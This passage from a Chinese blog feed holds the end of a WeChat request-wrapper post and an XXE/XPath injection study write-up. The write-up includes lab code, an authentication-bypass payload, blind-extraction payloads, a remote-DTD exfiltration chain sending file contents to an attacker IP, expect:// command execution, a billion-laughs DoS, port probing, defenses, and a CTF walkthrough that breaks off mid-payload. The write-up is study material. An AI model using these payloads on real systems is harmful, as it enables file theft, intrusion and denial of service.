punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">postdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">fail</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">typeof</span> callback <span class="token operator">==</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  getdata<span class="token punctuation">,</span>  postdata<span class="token punctuation">&#125;</span></code></pre><p><code>app.js</code>引入</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> api <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span>'<span class="token punctuation">.</span><span class="token operator">/</span>api<span class="token operator">/</span>index<span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    api  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> api <span class="token operator">=</span> app<span class="token punctuation">.</span>globalData<span class="token punctuation">.</span>api<span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  api<span class="token punctuation">.</span><span class="token function">getdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  api<span class="token punctuation">.</span><span class="token function">postdata</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h4 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h4><p><code>app.js</code>引入</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'GET'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://es6.ruanyifeng.com/#docs/promise">Promise 对象</a></li><li><a href="https://blog.csdn.net/weixin_44833680/article/details/102658108">微信小程序封装异步请求</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/00028cbc2e04e0ddf549d535351c13">将小程序原生异步函数promisify后，在async/await中使用</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/000ceaee71c9d09ae5b8c77d151813">微信小程序中使用Async/Await方法异步请求变为同步请求</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;方法不唯一，后续有新方法再补上~&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发" scheme="https://www.extrader.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="JavaScript" scheme="https://www.extrader.top/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>XXE学习笔记</title>
    <link href="https://www.extrader.top/posts/55c267c8/"/>
    <id>https://www.extrader.top/posts/55c267c8/</id>
    <published>2020-08-11T02:06:34.000Z</published>
    <updated>2020-08-18T02:56:23.372Z</updated>
    
    <content type="html"><![CDATA[    <div id="aplayer-mbuGQWQJ" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="5174564734" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"></div><a id="more"></a><h3 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h3><p>XPath注入对象是一个存储数据的XML文件</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><strong>index.xml</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>rootpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>adminpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p><strong>index.php</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$xml&#x3D;simplexml_load_file(&#39;index.xml&#39;);$name&#x3D;$_GET[&#39;name&#39;];$pwd&#x3D;$_GET[&#39;pwd&#39;];$query&#x3D;&quot;&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;&quot;.$name.&quot;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]&quot;;echo $query;$result&#x3D;$xml-&gt;xpath($query);if($result)&#123;    echo &#39;&lt;h2&gt;Welcome&lt;&#x2F;h2&gt;&#39;;    foreach($result as $key&#x3D;&gt;$value)&#123;        echo &#39;&lt;br &#x2F;&gt;ID:&#39;.$value-&gt;id;        echo &#39;&lt;br &#x2F;&gt;Username:&#39;.$value-&gt;username;    &#125;&#125;?&gt;</code></pre><h4 id="直接注入"><a href="#直接注入" class="headerlink" title="直接注入"></a>直接注入</h4><p><strong>payload</strong></p><p><code>?name=&#39; or 1=1 or &#39;&#39;=&#39;&amp;pwd=1</code>，结果如下，类似sql注入，绕过了xml查询</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811093843233.png" alt loading="lazy"></p><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><strong>payload</strong></p><p>有返回结果则为正确</p><pre class="language-xml" data-language="xml"><code class="language-xml">推测根节点数，有返回结果则说明只有一个根节点' or count(/*) = 1 or '1' = '2  猜解一级节点' or substring(name(/*[position() = 1]),1,1)='r' or '1'='2  ' or substring(name(/*[position() = 1]),1,1)='o' or '1'='2  ......推测root的下一级节点数' or count(/root/*) = 1 or '1' = '2猜解root的下一级节点' or substring(name(/root/*[position() = 1]),1,1)='u' or '1'='2' or substring(name(/root/*[position() = 1]),1,1)='s' or '1'='2......猜解节点中的数据' or /root/users/user[1]/username[contains(text(),'r')] or '1'='2  ' or /root/users/user[1]/username[contains(text(),'ro')] or '1'='2  ......</code></pre><ul><li><code>/ ：</code>从根节点选取</li><li><code>// ：</code>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置</li><li><code>. ：</code>选取当前节点</li><li><code>.. ：</code>选取当前节点的父节点</li></ul><h3 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h3><blockquote><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。</p><p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p></blockquote><blockquote><p>XXE的造成与PHP版本无关，与libxml库的版本有关。libxml &lt;= 2.9.0中，默认启用了外部实体，libxml&gt;2.9.0中默认仅用了外部实体。XXE并不是直接由libxml库造成的，libxml库提供了一些XML核心功能，包括禁用外部实体的libxml_disable_entity_loader()函数，SimpleXML库提供了解析XML的函数，SimpleXML库依赖于libxml库。</p></blockquote><p>本地测试环境php.4.45   libxml = 2.7.8</p><p>外部实体可支持http、file等协议。不同程序支持的协议不同</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811110816675.png" alt loading="lazy"></p><h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$xml &#x3D; simplexml_load_string($_REQUEST[&#39;xml&#39;]);print_r($xml);?&gt;</code></pre><p><strong>payload</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY file SYSTEM "file:///d://flag.txt" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>url编码后给传入，即在 xml 中 <code>&amp;file ;</code> 变成了外部文件<code>qwzf.txt</code>中内容，导致敏感信息泄露。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811102323743.png" alt loading="lazy"></p><h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$xml &#x3D; simplexml_load_string($_REQUEST[&#39;xml&#39;]);&#x2F;&#x2F; print_r($xml);?&gt;</code></pre><p>这种情况就需要将数据发送到远程服务器(攻击服务器)</p><p><strong>payload</strong></p><p><strong>传入的xml</strong>    两种方式</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE test[&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">%dtd;%send;]></span>另一种方式<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE root[&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">%dtd;]></span></code></pre><p><strong>远程服务器的xxe.dtd文件</strong>    两种方式</p><pre class="language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % payload "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218/?content=%file;'>">%payload;另一种方式：&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218:5000/?content=%file;'>">%int;%send;</code></pre><p>将xml进行url编码后传入</p><p>再查看远程服务器的apache日志文件</p><p><code>cat /var/log/apache2/access.log</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811104737190.png" alt loading="lazy"></p><p><code>nc -lvp 5000</code>  端口监听</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811111337248.png" alt loading="lazy"></p><p>解码后即是文件的内容</p><p>攻击流程</p><ul><li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</li><li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li><li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</li></ul><h4 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h4><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY xxe SYSTEM "expect://id" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>通过XXE可以实现RCE的实例很少。</p><h4 id="拒绝服务攻击-Dos"><a href="#拒绝服务攻击-Dos" class="headerlink" title="拒绝服务攻击(Dos)"></a>拒绝服务攻击(Dos)</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>   <span class="token doctype">&lt;!DOCTYPE lolz [&lt;!ENTITY lol "lol">&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;">&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;">&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;">&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;">&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;">&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;">&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;">&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;">]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span></code></pre><p><strong>原理</strong>：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p><h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p><strong>使用开发语言提供的禁用外部实体的方法</strong></p><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">libxml_disable_entity_loader(true);</code></pre><p>java:</p><pre class="language-java" data-language="java"><code class="language-java">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python:</p><pre class="language-python" data-language="python"><code class="language-python">from lxml import etreexmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</code></pre><p><strong>过滤用户提交的XML数据</strong></p><p>过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p><p><strong>不允许XML中含有自己定义的DTD</strong></p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h4><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE学习笔记/image-20200817204320669.png" style="zoom:80%;" loading="lazy"><p>题目提示<code>xml</code>，推测是<code>xxe</code>，于是<code>login</code>抓包，发现提交<code>username</code>和<code>password</code>是以一个<code>xml</code>格式的数据提交的，如下：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>于是进行<code>xxe</code>注入测试：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY file SYSTEM "file:///etc/passwd" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>回显<code>/etc/passwd</code>的内容，存在<code>xxe</code>注入，尝试读取文件，得到<code>doLogin.php</code>的代码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*** autor: c0ny1* date: 2018-2-7*&#x2F;$USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;账号$PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;密码$result &#x3D; null;libxml_disable_entity_loader(false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);try&#123;$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds &#x3D; simplexml_import_dom($dom);$username &#x3D; $creds-&gt;username;$password &#x3D; $creds-&gt;password;if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username);&#125;else&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username);&#125;&#125;catch(Exception $e)&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);echo $result;?&gt;</code></pre><p>测试读取<code>flag</code>，硬是没找到，无法命令执行，网上找了找<code>wp</code>，放心居然是内网探测，读取<code>/etc/hosts</code>的文件，读到本机<code>ip</code>地址<code>173.56.110.9</code>，于是探测子网：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY file SYSTEM "http://173.56.110.11" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token 